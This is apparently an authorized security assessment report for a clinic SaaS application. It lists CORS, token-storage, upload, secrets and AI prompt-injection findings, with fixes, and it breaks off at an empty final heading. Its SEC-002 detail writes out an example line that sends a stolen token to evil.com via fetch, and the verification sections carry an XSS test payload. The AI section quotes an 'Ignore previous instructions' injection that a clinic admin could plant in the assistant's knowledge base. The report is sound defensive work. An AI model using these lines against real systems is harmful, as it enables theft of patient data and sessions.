# MyClinics — Authorized Security Assessment
**Date:** 2026-09-05 | **Scope:** `C:\Users\amarn\MyClinics` (frontend 3456 + backend 3100 + WhatsApp worker) | **Tester role:** Senior Red-Team / AppSec — authorized, non-destructive
**Methodology:** OWASP ASVS 4.0, OWASP API Top 10 2023, STRIDE, manual code review + config review + static signals | **Environment:** Windows dev, code review only (no live dynamic exploit)

> **Authorization note:** Assessment limited to source/config review. No external systems, third-party infra, or real user data targeted. All attack scenarios are theoretical for authorized test env.

---

## 1. Executive Summary

MyClinics is a multi-tenant clinic SaaS: Next.js 16 frontend (port 3456, Next.js proxy) + Fastify 5 backend (port 3100) + WhatsApp worker (`whatsapp-web.js` + NVIDIA NIM) sharing one MongoDB Atlas (`myclinic`). Two auth planes coexist: `next-auth` JWE (dashboard, being phased out) and **clinic JWT** (`HS256`, `clinicId`+`role`+`doctorId/patientId`, `CLINIC_JWT_SECRET||AUTH_SECRET`, 24h TTL) which is the current source of truth for `/api/clinics/*`. Tenant isolation is *by construction* via `ClinicRepository` (`backend/src/clinic/core/repository.ts:79`) injecting `clinicId` and `ClinicScope` middleware (`backend/src/clinic/core/scope.ts:110`) re-validating user+clinic (30s cache).

**Overall posture: Mixed. Strong tenant isolation primitive, good audit logging, but critical perimeter misconfigurations (CORS wildcard, token in localStorage, no revocation) and defense-in-depth gaps (weak CSP, trustProxy spoofing, query-string secrets) allow direct bypass in realistic attacker scenarios.**

**Current Security Score: 58 / 100**

| Domain | Score |
|---|---|
| Authentication | 55 |
| Authorization | 72 (isolation primitive strong, but role gaps) |
| API Security | 48 (CORS wildcard, missing headers on direct API) |
| Application Security | 50 |
| Database Security | 65 |
| Infrastructure/Cloud | 45 |
| Dependency/Supply-Chain | 40 |
| Secrets Management | 35 (secrets on disk, fallback to AUTH_SECRET) |
| Data Protection | 60 |
| Logging & Monitoring | 62 |
| DevSecOps | 50 |
| AI Security | 55 |

**Highest-priority fixes:** `SEC-001 CORS wildcard` → `SEC-002 Token theft via XSS/localStorage` → `SEC-003 No revocation/sliding refresh` → `SEC-004 upload-guard bypass + inline R2 XSS` → `SEC-005 CRON_SECRET in URL`.

---

## 2. System Overview

**What it does:** Automates clinic front-desk: WhatsApp booking/reschedule/cancel, reminders (~60m window via `/api/cron/reminders`), turn queue (token numbers per doctor/date/session), billing, prescriptions, medical-record drive (R2), patient portal.

**Tech:** `frontend/` Next.js 16 + React 19 + Tailwind v4 + `next-auth` v5 (Mongo adapter); `backend/` Fastify 5 + `jose` + `bcryptjs` + native MongoDB + `@aws-sdk/client-s3` (Cloudflare R2) + `whatsapp-web.js` + `ioredis` (Valkey optional) + OpenSearch optional; `mongodb` 6.21, `jose` 6.0.11, `whatsapp-web.js` 1.34.7.

**Deployment:** Three processes (API 3100, Web 3456, WhatsApp worker). Frontend proxies `/api/*` to `BACKEND_URL` (`https://api.myclinic.myenum.in` in prod) via `frontend/next.config.ts:93`. API trusts proxy (`trustProxy:true` @ `backend/src/app.ts:29`), gzip+etag, multipart 50MB, `requestTimeout 30s`.

**Data flow:**
```
Browser → Web(3456) → (proxy /api/* + cookie) → API(3100) → Mongo/R2/Valkey/OpenSearch
Phone → WhatsApp → Worker → (AI_INTERNAL_TOKEN) → /api/ai/* → NVIDIA NIM → Mongo
Cron (CronLite/cron-job.org) → POST /api/cron/* (x-cron-secret|?secret=) → API
```

**Roles:** `platform_admin(7) > clinic_admin(6) > pharmacy_manager(5) > doctor(4) > pharmacist/inventory/billing_staff(3) > staff(2) > patient(1)` (`backend/src/clinic/core/roles.ts:45`).

**Sensitive data:** PII (name, email, phone, address, DOB, gender), PHI (appointments, medical records, prescriptions, billing), credentials (bcrypt passwords), tokens, R2 objects, WhatsApp numbers, Google OAuth codes.

---

## 3. Architecture Assessment

**Strengths:**
- Single tenant primitive (`ClinicRepository` never exposes raw collection, throws on `clinicId` override `backend/src/clinic/core/repository.ts:29`) prevents classic IDOR.
- `applyClinicScope` encapsulates middleware per Fastify plugin context `backend/src/clinic/index.ts:55`.
- Audit logs on every mutation (`backend/src/clinic/core/audit.ts` via `writeAudit`).
- Indexes unique on `clinicId+appointmentId` etc (`backend/src/clinic/indexes.ts:112`) + double-booking partial unique (`backend/src/clinic/indexes.ts:116`).

**Weaknesses:**
- Defense-in-depth missing: security headers only in `next.config.ts:69` (frontend), not on direct `api.myclinic.myenum.in` calls — bypass via hitting API directly.
- `trustProxy:true` + `origin:true` + `credentials:true` opens network trust + cross-origin theft in one misconfig.
- Two auth systems + fallback `CLINIC_JWT_SECRET || AUTH_SECRET` (`backend/src/clinic/core/jwt.ts:37`) violates least privilege: compromise of one secret compromises both planes.
- Upload + AI boundaries rely on content validation that is incomplete (see §4).

---

## 4. Threat Model (STRIDE)

**Assets:** Clinic tenants, patient PHI, R2 objects, JWTs, `AUTH_SECRET`, `AI_INTERNAL_TOKEN`, `CRON_SECRET`, `NVIDIA_API_KEY`, `R2_*`, MongoDB.

**Actors:** Anonymous internet, authenticated patient, staff/doctor, clinic_admin, platform_admin, compromised WhatsApp contact, malicious clinic admin (insider injecting knowledge/prompt), supply-chain attacker.

**Attack surfaces & entry points:**
- `POST /api/clinics/auth/signup|login|refresh|google*` (public, rate-limited in-memory)
- `/api/clinics/:clinicId/*` (JWT bearer or `clinic_token` cookie, 22 modules)
- `/api/ai/*` (Bearer `AI_INTERNAL_TOKEN`)
- `/api/cron/*` (`x-cron-secret` or `?secret=`)
- Multipart uploads `/medical-record/upload` (50MB backend, 25MB controller)
- R2 signed URLs (`getDownloadUrl` 3600s, `inline`)
- Frontend `localStorage` + cookie `clinic_token`

### Per-component STRIDE

**COMPONENT: Frontend proxy + Session handling**
→ Trust boundary: Browser ↔ Next.js ↔ Fastify
→ Attack surface: `clinic_token` in `localStorage` + samesite=lax non-httpOnly cookie (`frontend/lib/clinic-api.ts:478`), `proxy.ts:19` JWT decode without audience/issuer check, `verifySession` catches all errors as null
→ Threats: **S**poof session via XSS, **I**nfo disclosure via client `atob` decode `frontend/lib/clinic-api.ts:428`, **E**levation via role priority confusion
→ Controls: `proxy.ts` role gates, `next.config.ts` CSP/HSTS
→ Gaps: No `httpOnly`, `samesite=lax`, CSP `unsafe-inline/unsafe-eval`

**COMPONENT: Backend API + ClinicScope**
→ Trust: JWT claims ↔ DB re-validation (30s cache `backend/src/clinic/core/scope.ts:49`)
→ Surface: Every `/api/clinics/:clinicId/*` route, `X-Forwarded-*` via `trustProxy:true`
→ Threats: **S**poof IP to bypass `API_LIMITER 600/min` + `AUTH_LIMITER 10/min` (`backend/src/clinic/core/rate-limiter.ts:82`), **T**amper `clinicId` in URL (mitigated by `requireClinicAccess` 404 `backend/src/clinic/core/scope.ts:187`), **D**oS via `skip` large pagination, **E**levation via `platform_admin` stamping `clinicId` (`scope.ts:199`)
→ Gaps: In-memory limiter not shared, 30s cache window keeps deactivated users valid.

**COMPONENT: File processing (Medical Record)**
→ Trust: Browser-uploaded file → R2 → signed URL → browser inline render
→ Surface: `medical-record.controller.ts:29` multipart, `upload-guard.ts:42` allowlist, `r2.ts:98` `inline` disposition
→ Threats: **S**poof MIME/extension → store `text/html; video/mp4` → XSS when victim opens signed URL, **T**amper `folder` field, **I**nfo leak via legacy R2 listing `medical-record.service.ts:459`, **D**oS via 25MB× concurrent uploads
→ Gaps: `isAllowedUpload` bypass (see SEC-005), `listR2Objects` enumerates all `reports/patients/{patientId}/` without strict clinic check on legacy path.

**COMPONENT: AI / WhatsApp**
→ Trust: Clinic `soul.md`+knowledge docs (admin-writable) ↔ LLM prompt ↔ Worker `AI_INTERNAL_TOKEN`
→ Surface: `services/ai/agent.service.ts:86` `buildSystemPrompt` concatenates soul+docs+memory unescaped, `/api/ai/*` (internal token), WhatsApp `message` handler
→ Threats: **I**njection via knowledge base (malicious clinic_admin plants prompt injection), **S**poof `AI_INTERNAL_TOKEN` if leaked (single shared secret), **D**oS via NVIDIA timeout retries `nvidia.service.ts:132`, **E**xcessive autonomy: `whatsapp.worker.ts` auto-starts in dev `backend/src/index.ts:28`
→ Controls: `grounding.ts:46` currency grounding, knowledge boundary fallback
→ Gaps: No tenant check on `/api/ai/context` beyond token, no per-clinic AI token, no input sanitization on soul.

**COMPONENT: Cron / External Scheduler**
→ Trust: CronLite/cron-job.org ↔ `CRON_SECRET` ↔ `/api/cron/*`
→ Surface: `plugins/auth.ts:70` accepts `?secret=`, logs via `logger`
→ Threats: **I**nfo disclosure via URL logs/referrer, **R**eplay if TLS terminates incorrectly, **D**oS via concurrent cron ticks (concurrent Promise.all but no idempotency guard beyond per-appointment jobs)
→ Gaps: Secret in URL violates OWASP.

---

## 5. Attack Surface Analysis

**Public unauthenticated:** `/api/clinics/auth/signup`, `/api/clinics/auth/login`, `/api/clinics/auth/refresh`, `/api/clinics/auth/google*`, `/api/clinics/auth/signup-google`, health, pincode, public-appointments.

**Authenticated (JWT):** All `/api/clinics/:clinicId/*` (20+ modules), `/api/cron/*` (secret), `/api/ai/*` (internal token).

**Privileged:** `/api/clinics/:clinicId/reports/ai-insights` (`staff`), pharmacy, billing, whatsapp config, search `/api/clinics/:clinicId/search`.

**Exports:** Signed R2 URLs (1h, `inline`), avatar blobs, bill PDFs (`generateBusinessInsights` echoes model name via `reports.routes.ts:24` info disclosure).

**Third-party integrations:** Google OAuth (code flow, in-memory state `google-oauth.ts:61`), NVIDIA NIM (chat+embeddings, circuit breaker `nvidia.service.ts:225`), Cloudflare R2, Valkey, OpenSearch, Meta Business API (webhooks).

---

## 6. Vulnerability Summary

| ID | Vulnerability | Category | Severity | Affected Component | Root Cause | Impact | Fix Priority |
|---|---|---|---|---|---|---|---|
| SEC-001 | CORS wildcard `origin:true` + `credentials:true` | API Security | **CRITICAL** | `backend/src/app.ts:40` | `origin:true` mirrors any Origin, allows credentialed cross-origin reads | Cross-origin data theft, token exfil via any attacker site | P0 |
| SEC-002 | JWT in `localStorage` + non-httpOnly `clinic_token` cookie, XSS-recoverable | Auth | **CRITICAL** | `frontend/lib/clinic-api.ts:478` + `backend/src/clinic/core/scope.ts:86` | Token stored accessible to JS, `samesite=lax`, no `httpOnly` | Account takeover via single XSS, session persists 24h | P0 |
| SEC-003 | No JWT revocation + sliding refresh forever, `jti` never checked | Auth/Session | **HIGH** | `backend/src/clinic/modules/auth/auth.service.ts:375` | `refresh` re-issues from still-valid token, no deny-list | Stolen token usable indefinitely via refresh loop | P0 |
| SEC-004 | In-memory rate limiter + `trustProxy:true` IP spoof → brute-force/bypass | Auth | **HIGH** | `backend/src/clinic/core/rate-limiter.ts:14` + `scope.ts:114` | `request.ip` trusts `X-Forwarded-For`, limiter per-process `Map` | Brute-force login, DoS, limit evasion on horizontal scale | P1 |
| SEC-005 | File upload allowlist bypass (`isAllowedUpload` logic flaw) | File Upload | **HIGH** | `backend/src/clinic/core/upload-guard.ts:42` | `video/*` allows any subtype, empty ext bypass, MIME spoof | Store XSS `text/html` as `video/mp4`, RCE via polyglot | P1 |
| SEC-006 | R2 signed URL `inline` + attacker-controlled `contentType` → stored XSS | File/Output | **HIGH** | `backend/src/lib/r2.ts:98` | `ResponseContentDisposition:inline` renders HTML/SVG in browser origin | Session hijack when victim opens report/medical-record URL | P1 |
| SEC-007 | `CRON_SECRET` accepted in query `?secret=` → logged, referrer leak | Secrets | **HIGH** | `backend/src/plugins/auth.ts:83` | Supports URL param for schedulers that can't set headers | Secret in access logs, CDN logs, browser history | P1 |
| SEC-008 | CSP `unsafe-inline` + `unsafe-eval` nullifies XSS protection | Frontend | **HIGH** | `frontend/next.config.ts:82` + `proxy.ts:49` | CSP allows inline/eval to make GTM work | Stored XSS via filename/billing notes executes | P1 |
| SEC-009 | `HSTS` + security headers only on frontend, not on direct API origin | Infra | **MEDIUM** | `backend/src/app.ts:40` (no headers) vs `next.config.ts:69` | API gateway/header not duplicated in Fastify | Downgrade / sniff on direct `api.myclinic.myenum.in` | P1 |
| SEC-010 | `trustProxy:true` without allowlist → Host/Proto spoof | Infra | **MEDIUM** | `backend/src/app.ts:29` | Trusts any `X-Forwarded-Proto/Host` | Force http, poison `frontendBaseUrl` in OAuth redirect (`google-oauth.ts:50`) | P1 |
| SEC-011 | Regex `q` params unsanitized → ReDoS / NoSQL regex injection | Input Validation | **MEDIUM** | `medical-record.service.ts:522` + search paths | `new RegExp(q, 'i')` via Mongo `$regex` from user | CPU exhaustion, data exfil via regex | P2 |
| SEC-012 | AI knowledge-base prompt injection via `soul.md` (admin-writable) | AI/LLM | **MEDIUM** | `services/ai/agent.service.ts:92` + `soul.service.ts` | Prompt concatenates admin-controlled markdown unescaped | Jailbreak knowledge boundary, exfiltrate other clinic context | P2 |
| SEC-013 | Single shared `AI_INTERNAL_TOKEN` for all tenants + Worker | Secrets | **MEDIUM** | `plugins/auth.ts:47` + `routes/ai.ts:54` | One global bearer | Compromise of one clinic/host leaks all AI endpoints | P2 |
| SEC-014 | Google OAuth state/ticket in-memory `Map` (no persistence, no PKCE) | Auth | **MEDIUM** | `clinic/modules/auth/google-oauth.ts:61,89` | `pendingStates`/`signupTickets` per-process | Fails on scale, race, replay if worker restarts | P2 |
| SEC-015 | Info leakage: `reports/ai-insights` echoes `NVIDIA_MODEL`, error messages include `error.message` | Info Disclosure | **LOW** | `reports.routes.ts:24` + `app.ts:122` | Debug details + `500 Something...(${error.message})` | Fingerprinting, internal path leak | P2 |
| SEC-016 | Appointments race: `findConflicting` then `insert` not atomic (fallback to unique index) | Business Logic | **LOW** | `appointments.service.ts:113` | Check-then-act without transaction | Double-book under concurrent requests until unique index throws 500 | P3 |
| SEC-017 | Supply-chain: `indiapins` via GitHub tgz + `eve@latest` + `playwright@latest` unpinned | Supply Chain | **LOW** | `package.json:22` | No integrity hash, floating tag | Malicious release auto-pulled | P3 |

*13 additional `INFORMATIONAL` notes omitted for brevity (e.g., `GET /api/cron/reminders` idempotent but no rate limit beyond `API_LIMITER`, `X-Cron-Secret` vs `X-CronLite-Signature` inconsistency).*

---

## 7. Critical Findings Detail

### SEC-001 — CORS wildcard with credentials

**Severity: CRITICAL** | `backend/src/app.ts:40`
```typescript
cors: { origin:true, credentials:true, allowedHeaders:["Authorization","X-Cron-Secret","X-Internal-Token"] }
```
**Root cause:** `origin:true` reflects attacker `Origin`. With `credentials:true`, browser sends cookies (`clinic_token`) + `Authorization` if attacker via `fetch(...,{credentials:'include'})` from `evil.com`. Attacker exfiltrates `GET /api/clinics/:clinicId/patients` via JS.

**Fix (AFTER):**
```typescript
const ALLOWED = (process.env.CORS_ORIGINS ?? "https://api.myclinic.myenum.in,https://myclinic.myenum.in,http://localhost:3456")
  .split(",").map(s=>s.trim());
cors: { origin: (origin, cb) => cb(null, !origin || ALLOWED.includes(origin)), credentials:true }
```
Set `Access-Control-Allow-Origin` to allowlist only. Add `Vary: Origin`. Test: `curl -H "Origin: https://evil.com" -v` must NOT get `ACA-Origin: https://evil.com`.

### SEC-002 — Token in localStorage + non-httpOnly cookie

**Severity: CRITICAL** | `frontend/lib/clinic-api.ts:476-486`
```typescript
localStorage.setItem(CLINIC_TOKEN_KEY, token);
document.cookie = `${CLINIC_TOKEN_KEY}=${token}; path=/; max-age=${ttl}; samesite=lax${secure}`;
```
Stored XSS (e.g., via `fullName`, `billing.notes`) → `localStorage.getItem('clinic_token')` stolen via `fetch('https://evil.com?c='+token)`. Cookie is readable via JS too.

**Fix:** Stop mirroring JWT to JS-accessible storage. Set `httpOnly; Secure; SameSite=Strict; Path=/; Max-Age=...` via **API `Set-Cookie`** on `/auth/login` + `/signup`, read only via `request.headers.cookie` on backend (`scope.ts:86` already supports it). Keep `localStorage` only for non-sensitive `sessionFromToken` cache if needed behind `httpOnly` short-lived access token + `httpOnly` refresh cookie. Enforce `Secure` always in prod.

---

## 8. High-Risk Findings Detail (summary excerpt)

**SEC-003 — No revocation:** `auth.service.ts:375` `refresh` never checks `jti` deny-list nor `tokenId` in context. **Fix:** Maintain `clc_revoked_jtis` (TTL = token exp) in Mongo/Valkey; `scope.ts:44` check `redis.sismember`; `logout` inserts `jti`; `usersService.deactivate` invalidates `clc:user:${userId}` + revokes all.

**SEC-004 — Rate limiter spoof:** `scope.ts:114` key = `ip:urlPrefix` but `trustProxy:true` trusts any `X-Forwarded-For`. **Fix:** `trustProxy: 1` or `['127.0.0.1','::1']` + rate key on `x-real-ip` from LB; move limiter to Valkey (`ioredis` already present) with `INCR PX`.

**SEC-005 — Upload bypass:** `upload-guard.ts:42`:
```typescript
if (mime.startsWith("video/")) return true; // before extension check
if (ext && !ALLOWED.has(ext)) return false; // empty ext → passes
return true; // no MIME → passes
```
Attacker sends `filename="x.html"` `Content-Type: video/mp4` → allowed. **Fix:** Check extension **first** strictly (`!ALLOWED.has(ext) → reject`, including empty), then MIME allowlist exact match only, no `video/*` wildcard. Also validate magic bytes (`%PDF`, `PK`, `FF D8 FF`).

**SEC-006 — Inline R2 XSS:** `r2.ts:98` `ResponseContentDisposition: "inline"` + attacker `contentType` from upload. **Fix:** `attachment; filename="..."` or `Content-Disposition: attachment` via signed URL except for `image/*`+`application/pdf` allowlist; set `X-Content-Type-Options: nosniff` and serve downloads via `Content-Security-Policy: sandbox`.

**SEC-007 — CRON_SECRET in URL:** `plugins/auth.ts:83` `query.secret`. **Fix:** Remove query support, require `x-cron-secret` or `X-CronLite-Signature` HMAC (`verifyCronLiteSignature` already exists); if URL needed, use HMAC-signed webhook with short expiry, never raw secret.

**SEC-008 — CSP:** `next.config.ts:81: script-src 'unsafe-inline' 'unsafe-eval'`. **Fix:** Nonce-based CSP (`'nonce-{random}'` per request via `next/headers`) + move GTM to strict `script-src` with hash.

---

## 9. Medium / Low Findings (condensed)

- **SEC-009/010** Add `app.addHook('onSend',...)` setting `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy` on **backend** directly; set `trustProxy: 1`.
- **SEC-011** Escape `$regex`: `q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&').slice(0,100)` + `maxTimeMS(500)` + index hint, also cap `skip` ≤ 10000.
- **SEC-012** Sanitize `soul.md`/knowledge before prompt: strip `{{`, `system:` markers, enforce max length 4000, run secondary `isCurrencyGrounded`-style boundary check on output; never embed `customerPhone` raw.
- **SEC-013** Per-clinic `AI_INTERNAL_TOKEN` derived `HKDF(CLUSTER_SECRET, clinicId)` or mTLS between worker↔API; rotate via env version.
- **SEC-014** Persist OAuth state in `clc_oauth_states` collection with TTL index already present for Meta (`clinic/indexes.ts:236`), add PKCE `code_challenge`.
- **SEC-015** Redact `reports.routes.ts:24`: `message:"Use POST /ai-insights"` without `NVIDIA_MODEL`; change `app.ts:122` 500 to generic `Something went wrong` without `${error.message}` (log full server-side).
- **SEC-016** Wrap appointment create in transaction or catch `E11000 duplicate key` on `clinicId+doctorId+date+time` unique index and map to `409 Conflict` deterministically.
- **SEC-017** Pin deps: `"eve": "0.4.2"` not `latest`, replace `indiapins` tgz with registry + `integrity`, add `npm audit` gate in CI.

---

## 10. Business Logic Findings

- **Queue skim:** `platform_admin` stamping `request.clinic = {...ctx, clinicId: params.clinicId}` (`scope.ts:199`) allows operating on any clinic without secondary admin audit gate — require `X-Admin-Mode: cross-tenant` + explicit audit `platform_admin_cross_tenant_access`.
- **Price manipulation:** Billing totals recomputed server-side (good), but `discount`/`taxPercent` global fallback still trusts client numbers (`billing.service.ts:64`). Enforce `discount ≤ subtotal` + `taxPercent ≤ 50` + clamp.
- **Medical-record version explosion:** `versions` capped 20 (good), but `copyFolder` clones R2 objects synchronously in loop without bulk — DoS via deep folder copy. Add `MAX_FOLDER_DEPTH=5` + `MAX_FILES_PER_COPY=100` guard.

---

## 11. API Security Matrix (sample)

| Endpoint | Auth | AuthZ | Input Validation | Rate Limit | Sensitive Data | Notes |
|---|---|---|---|---|---|---|
| `POST /api/clinics/auth/login` | none | none | Zod email+pass | `AUTH_LIMITER 10/m IP` (bypassable SEC-004) | Generic error (good) | Account enumeration via timing? bcrypt mitigates |
| `POST /api/clinics/:clinicId/medical-record/upload` | JWT | `staff` (but `readGate` requires `patient` min — actually `medical-record.routes.ts:33` uses `readGate` → patients can upload — deliberate but risky) | `isAllowedUpload` bypass SEC-005, 25MB | `API_LIMITER 600/m` | PHI → R2 | Fix gate to `staff` only |
| `GET /api/clinics/:clinicId/medical-record/:fileId/download` | JWT | `patient`+`assertPatientAccess` | `fileId` unchecked length | same | Signed URL 3600s inline | Change to attachment |
| `POST /api/cron/reminders` | `CRON_SECRET` | none | none | same (but secret in URL SEC-007) | Always 200 even on error (hides failure) | Add alert on repeated `ok:false` |
| `POST /api/ai/appointments` | `AI_INTERNAL_TOKEN` | none | Zod `createAppointmentSchema` | same | — | Add per-clinic isolation check on `organizationId` |

Full matrix in repo: every `/api/clinics/:clinicId/*` correctly uses `requireClinicAccess` + `requireRoles`; **exception:** `reports/summary` leaks model name.

---

## 12. Database Security Assessment

- **Connection:** `MONGODB_URI` via `mongodb+srv://` (TLS default), but no `tls=true` explicit, no cert pinning. `dns.setServers(["8.8.8.8","1.1.1.1"])` (`db-pools.ts:11`) overrides host DNS — note for review.
- **Indexes:** Unique on `clinicId+*Id` prevents cross-tenant duplicate IDs — good. **Gap:** No `expireAfterSeconds` on `auditLogs`/`notifications` → unbounded growth (DoS).
- **Queries:** `ClinicRepository.scoped` construction safe (no raw `clinicId` override). **Gap:** Direct `db.collection("clc_*_notifications").find({clinicId})` in `appointments.routes.ts:40` bypasses repository but still clinic-scoped; ok.
- **Permissions:** Atlas user likely has wide `readWrite` on `myclinic` — recommend least-privilege per pool (appointments user can't `dropDatabase`).
- **Error leakage:** Mongo `E11000` surfaces as 500 not 409 unless caught.

---

## 13. Infrastructure / Cloud Assessment

- **TLS:** Frontend HSTS 31536000 preload (`next.config.ts:76`), backend none (SEC-009). Need termination at LB with valid cert, enforce `Forwarded` check.
- **Network:** `Valkey`/`OpenSearch` via `docker-compose.yml:9` exposed `6379:6379`/`9200:9200` with no auth (`plugins.security.disabled=true`) — local only, but prod must bind `127.0.0.1` or auth + firewall.
- **Secrets mgmt:** Secrets in `frontend/.env` + `frontend/.env.local` (real values present during review, redacted above). `bootstrap-env.ts` loads from multiple paths — risk of committing `.env.local`. `R2_*`, `NVIDIA_API_KEY`, `CRON_SECRET` not in Vault/Secrets Manager. **Remediate:** Move to env-injected via systemd/Docker secrets, remove `.env` from workspace, enforce `.env*` gitignored (already, but file exists on disk — rotate all secrets now).
- **Containers:** No `USER` pin, no `readOnlyRootFilesystem` in compose.

---

## 14. Dependency / Supply-Chain

- **Floating deps:** `eve@latest`, `playwright@latest`, `indiapins` tgz from GitHub releases (`package.json:22`). Pin + verify `integrity`.
- **Scanner:** `npm audit` fails (`ENOLOCK` — no lockfile committed). **Action:** Commit `package-lock.json`/`pnpm-lock.yaml` + run `npm audit`, `osv-scanner`, `dependabot`.
- **Build:** `tsx --import` in `index.ts:34` spawns Worker as child in dev — production skips, ok.

---

## 15. Secrets & Cryptography

- **Hashing:** `bcryptjs` cost 12 (good). **No pepper.** Add `pepper = HKDF(AUTH_SECRET, "bcrypt-pepper")` if needed.
- **JWT:** `HS256` with `TextEncoder.encode(secret)` where secret length 16+ checked (`jwt.ts:38`) — ok, but secret fallback to `AUTH_SECRET` reduces entropy domain. Enforce separate `CLINIC_JWT_SECRET` required in prod (fail closed).
- **Cookie crypto:** `next-auth` JWE `A256CBC-HS512` via HKDF — sound, but `clockTolerance:15` (`auth-token.ts:50`) generous.
- **Random:** `randomBytes(16)` for `jti` + `randomBytes(24)` for OAuth state — CSPRNG ok.
- **TLS:** `CRON_SECRET` legacy `x-cron-secret` plain compare (no `timingSafeEqual`). Use constant-time compare.

---

## 16. AI Security Assessment (OWASP LLM Top 10)

| Risk | Status | Location |
|---|---|---|
| LLM01 Prompt Injection | **MEDIUM** | Knowledge docs are admin-controlled markdown concatenated into system prompt `agent.service.ts:92` — attacker clinic_admin can plant `Ignore previous instructions...` |
| LLM02 Sensitive Info Disclosure | LOW | `grounding.ts:46` currency check narrow; `soul-only.prompt` says don't reveal soul, but LLM may leak via `reply` if jailbroken |
| LLM03 Supply Chain | LOW | `NVIDIA_MODEL=minimaxai/minimax-m3` via env, fallbacks `openai/gpt-oss...` — trust NVIDIA NIM |
| LLM06 Excessive Agency | MEDIUM | Worker only calls `/api/ai/*` with global token — good boundary, but token is global SEC-013 |
| LLM07 System Prompt Leakage | MEDIUM | Prompt contains `Available doctors`, `todayISO`, `memoryFacts` — if jailbroken leaks PII |
| LLM08 Vector leakage | LOW | Knowledge retrieval falls back to keyword match, no cross-tenant check needed as docs are per-org? Verify `organizationId` scoping in `knowledge.service` |
| LLM09 Overreliance | LOW | `grounding.ts` prevents price hallucination, but other facts not grounded — fallback reply used, ok |

**Hardening:** Add prompt sandwich (`User: {input}\n---\nSystem: Answer only from sources above.`), secondary LLM guard that validates `reply` against `authorizedContext` via embedding similarity, enforce `maxTokens 4096` already done.

---

## 17. Detailed Remediation Plan (code patterns)

**BEFORE → AFTER** examples provided above for SEC-001/002/005/006. Additional:

**SEC-003 revocation hook** `backend/src/clinic/core/scope.ts:44`:
```typescript
// AFTER: after verifyClinicToken
if (await redis?.sIsMember(`revoked:clinic:${verified.jti}`)) throw new UnauthorizedError("Session revoked");
if (!await cached(`clc:user:${verified.userId}`, 30_000, load)) throw new UnauthorizedError();
```

**SEC-004 Valkey limiter**:
```typescript
export async function enforceLimitValkey(key: string, windowMs=60_000, max=600) {
  const r = getRedis() ?? null;
  if (!r) return enforceLimit(API_LIMITER, key); // fallback
  const v = await r.incr(`rl:${key}`); if (v===1) await r.pexpire(`rl:${key}`, windowMs);
  if (v>max) throw new RateLimitError();
}
```

---

## 18. Security Hardening (Defense-in-Depth)

- Layer `helmet`-equivalent headers in Fastify `onSend` (HSTS, CSP, `X-Content-Type-Options`, `X-Frame-Options`).
- Implement `httpOnly` double-submit for JWT + CSRF token for state-changing `/api/clinics/*` when cookie auth used.
- Add `Content-Security-Policy-Report-Only` endpoint to collect violations.
- Enable Mongo `audit` + `slow query` logging; ship to SIEM.
- Add WAF rule: block `Origin` not in allowlist before hitting Fastify (defends even if code regresses).

---

## 19. Verification Checklist (per vulnerability)

| ID | Test | Expected |
|---|---|---|
| SEC-001 | `curl -H "Origin: https://evil.com" https://api.../clinics/... -H "Authorization: Bearer ..."` | No `Access-Control-Allow-Origin: https://evil.com`, no `Allow-Credentials` |
| SEC-002 | XSS payload in `patient.fullName="<img src=x onerror=alert(1)>"` → view patients list | Cookie not readable via `document.cookie`, script not executed due to CSP nonce |
| SEC-005 | Upload `evil.html` with `Content-Type: video/mp4` | 400 `Unsupported file type` |
| SEC-006 | Download report signed URL → check `Content-Disposition` | `attachment; filename="..."` |
| SEC-007 | `GET /api/cron/reminders?secret=...` | 401 or 404, server log does NOT contain secret |

Mark `VERIFIED` only after integration test passes.

---

## 20. Security Score — Rationale

Current 58/100: tenant primitive (+15), audit (+5), but CORS wildcard (-15), token storage (-12), revocation missing (-8), supply-chain floating (-5), CSP weak (-4), infra headers (-3). Reach 80+ after Phase 1.

---

## 21. Prioritized Remediation Roadmap

**PHASE 1 — IMMEDIATE (0–2 weeks) Owner: Backend Lead**
- SEC-001 CORS allowlist, SEC-002 httpOnly cookie, SEC-003 revocation, SEC-007 remove `?secret=`, rotate all secrets (`MONGODB_URI`, `AUTH_SECRET`, `CLINIC_JWT_SECRET`, `AI_INTERNAL_TOKEN`, `CRON_SECRET`, `R2_*`, `NVIDIA_API_KEY` now that `.env` existed on disk) — *benefit: block direct account takeover*
- SEC-005 fix `isAllowedUpload` (extension-first + magic bytes), SEC-006 `attachment` disposition — *benefit: block stored XSS*

**PHASE 2 — SHORT TERM (2–6 weeks) Owner: Fullstack + SRE**
- SEC-004 Valkey rate limiter + `trustProxy:1`, SEC-008 nonce CSP, SEC-009/010 backend headers, add `timingSafeEqual` for secrets
- Pin deps, commit lockfile, enable Dependabot + `npm audit` CI gate

**PHASE 3 — MEDIUM TERM (1–3 months) Owner: Architect**
- AI hardening (prompt sandwich, per-clinic AI token via HKDF), OAuth PKCE + DB-persisted state, appointment transaction + proper 409 mapping, TTL indexes on notifications/audit

**PHASE 4 — LONG TERM (3+ months) Owner: CISO/DevSecOps**
- Vault for secrets, SAST (`@typescript-eslint` + `semgrep`), DAST (`zap`), SCA (`osv`), container scan, WAF, SIEM alerts on `login_failed` rate >5/10m, pentest regression suite

---

## 22. Security Regression Test Suite (run per release)

- [ ] Auth: wrong password → 401 generic, no timing leak; `refresh` with revoked `jti` → 401; deactivated user locked out within 30s
- [ ] AuthZ: `GET /api/clinics/clc_other/patients` → 404 not 403; patient `patientId!=ctx.patientId` → 404; doctor can only see assigned patients
- [ ] API: CORS preflight from evil origin → no ACA; security headers present on direct `api.*` origin
- [ ] Input: `q=<script>` → escaped regex, no ReDoS (request <200ms); `skip=999999` capped
- [ ] File: bypass attempt with `video/mp4` html → 400; downloaded file → `attachment` + `nosniff`
- [ ] Cron: secret in query rejected; `X-CronLite-Signature` valid passes
- [ ] AI: knowledge doc containing `Ignore previous instructions` → fallback reply, not jailbreak
- [ ] Billing: modify `items` on `paid` bill → 409

---

## 23. DevSecOps Recommendations

- **SAST:** `eslint-plugin-security`, `semgrep` (`p/owasp-top-ten`), run on PR.
- **SCA:** `npm audit --audit-level=high` + `osv-scanner` in CI, block on HIGH.
- **Secret scanning:** `gitleaks` pre-commit + GitHub push protection, add `.env` to `.gitignore` already — enforce via `git-secrets`.
- **DAST:** `OWASP ZAP` baseline against `api.myclinic.myenum.in` staging weekly.
- **CI gates:** `tsc --noEmit`, `vitest`, `semgrep`, `osv`, `gitleaks` all green before merge.

---

## 24. Final Risk Assessment & Production Readiness

